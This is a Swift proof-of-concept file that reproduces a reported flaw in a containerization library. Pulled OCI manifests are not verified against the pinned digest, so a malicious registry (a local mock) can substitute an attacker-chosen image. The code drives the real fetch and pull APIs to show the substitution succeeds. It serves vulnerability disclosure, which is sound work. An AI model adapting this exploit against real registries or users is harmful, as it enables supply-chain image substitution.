// manifest-poc
//
// Standalone reproduction for OE1107240405872: "Manifest/index content not
// verified against digest during OCI image pull".
//
// Calls the REAL project code -- RegistryClient.fetch/fetchData and
// ImageStore.pull -- against mock_registry.py, a minimal malicious registry
// that simulates the FULL attack described in the report: HEAD responses
// report a Docker-Content-Digest that does NOT match the digest actually
// requested/pinned (resolve()'s gap), and the content served back is
// self-consistent with THAT redirected digest but unrelated to the one the
// caller pinned (fetch()'s gap). This directly answers Apple's stated
// objection to the original report: "The included script does not call the
// affected code; it represents the absence of a check rather than testing
// the real code path."
//
// Usage: manifest-poc <port> <expectedDigest>
//   <port>           -- port mock_registry.py is listening on (127.0.0.1)
//   <expectedDigest>  -- EXPECTED_DIGEST printed by mock_registry.py at startup
//                        (the digest a caller would pin; the mock registry
//                        will redirect resolve() away from this on purpose)

import Containerization
import ContainerizationOCI
import Crypto
import Foundation

let arguments = CommandLine.arguments
guard arguments.count >= 3, let port = Int(arguments[1]) else {
    print("usage: manifest-poc <port> <expectedDigest>")
    exit(1)
}
let expectedDigest = arguments[2]
let name = "victim/image"

func line(_ s: String = "") { print(s) }

line("========================================================================")
line("PART 1 -- direct RegistryClient.fetch() against the real project code")
line("========================================================================")
line("[*] Constructing RegistryClient(host: \"127.0.0.1\", scheme: \"http\", port: \(port))")
let client = RegistryClient(host: "127.0.0.1", scheme: "http", port: port)

let pinnedDescriptor = Descriptor(
    mediaType: MediaTypes.imageManifest,
    digest: expectedDigest,
    size: 0  // size isn't checked by fetch() either; irrelevant to this PoC
)

line("[*] Requesting manifest at PINNED digest: \(expectedDigest)")
line("    (this is the digest a caller would pin via image@\\(expectedDigest))")

var fetchedManifest: Manifest?
do {
    let manifest: Manifest = try await client.fetch(name: name, descriptor: pinnedDescriptor)
    fetchedManifest = manifest
    line("[+] client.fetch() returned SUCCESSFULLY -- no digest-mismatch error was thrown.")
    line("    Returned manifest has \(manifest.layers.count) layer(s).")
    line("    layers[0].digest = \(manifest.layers.first?.digest ?? "none")")
    line("    config.digest    = \(manifest.config.digest)")
} catch {
    line("[!] client.fetch() threw: \(error)")
    line("    (If you see this, the vulnerability may already be fixed --")
    line("     fetch() is now rejecting mismatched content.)")
}

line("")
line("[*] Independently fetching the SAME URL as raw bytes via client.fetchData()")
let rawBody = try await client.fetchData(name: name, descriptor: pinnedDescriptor)
let computedDigest = SHA256.hash(data: rawBody).digestString
line("    requested digest       : \(expectedDigest)")
line("    actual SHA256 of body  : \(computedDigest)")

if computedDigest != expectedDigest {
    line("")
    line("[+] CONFIRMED: the response body does NOT hash to the digest it was")
    line("    requested/pinned by. client.fetch() above accepted and decoded it anyway.")
    line("")
    line("    This is precisely the check ImageStore+Import.swift performs for blob")
    line("    content:  guard digest.digestString == descriptor.digest else { throw ... }")
    line("    getManifestContent() -- the manifest path -- never performs it.")
} else {
    line("[!] Unexpected: body DID match the requested digest. Mock registry misconfigured?")
}

line("")
line("========================================================================")
line("PART 2 -- full ImageStore.pull() end-to-end (matches original report's")
line("          literal reproduction steps: `container pull name@sha256:...`)")
line("========================================================================")

let tempRoot = FileManager.default.temporaryDirectory
    .appendingPathComponent("manifest-poc-store-\(UUID().uuidString)")
line("[*] Creating throwaway ImageStore at \(tempRoot.path)")
let store = try ImageStore(path: tempRoot)

let reference = "127.0.0.1:\(port)/\(name)@\(expectedDigest)"
line("[*] Calling store.pull(reference: \"\(reference)\", insecure: true)")
line("    This is the exact same public API `container pull` uses.")
line("    The mock registry will report a DIFFERENT Docker-Content-Digest")
line("    than \(expectedDigest) in its HEAD response (resolve()'s gap),")
line("    then serve content that is self-consistent with THAT digest but")
line("    unrelated to the one pinned here (fetch()'s gap).")
line("")

do {
    let image = try await store.pull(reference: reference, insecure: true)
    line("[+] pull() SUCCEEDED. No digest-mismatch error at any point.")
    line("    pinned digest (what the reference asked for) = \(expectedDigest)")
    line("    image.digest  (what actually got imported)   = \(image.digest)")
    line("    image.reference  = \(image.reference)")
    line("    image.mediaType  = \(image.mediaType)")
    line("")
    if image.digest != expectedDigest {
        line("[+] IMPACT CONFIRMED: a pull pinned to one digest silently imported")
        line("    a completely different, attacker-chosen manifest and its referenced")
        line("    layers, with no error anywhere in the chain. Nothing checked that")
        line("    the actually-imported digest matched the one that was pinned.")
    } else {
        line("[?] image.digest matches the pinned digest -- unexpected given the mock")
        line("    registry's behavior; double check mock_registry.py's HEAD handler.")
    }
} catch {
    line("[!] pull() threw: \(error)")
    line("    This means something in the pull chain DID reject the substitution.")
    line("    (Earlier testing found fetchAll()'s self-consistency check catches a")
    line("     same-digest body substitution; this run specifically tests whether")
    line("     resolve()'s digest-redirect gap is independently exploitable even")
    line("     when the substituted content is self-consistent with whatever")
    line("     resolve() reported. Check Part 1 above regardless -- that gap is")
    line("     confirmed independent of this result.)")
}

try? FileManager.default.removeItem(at: tempRoot)
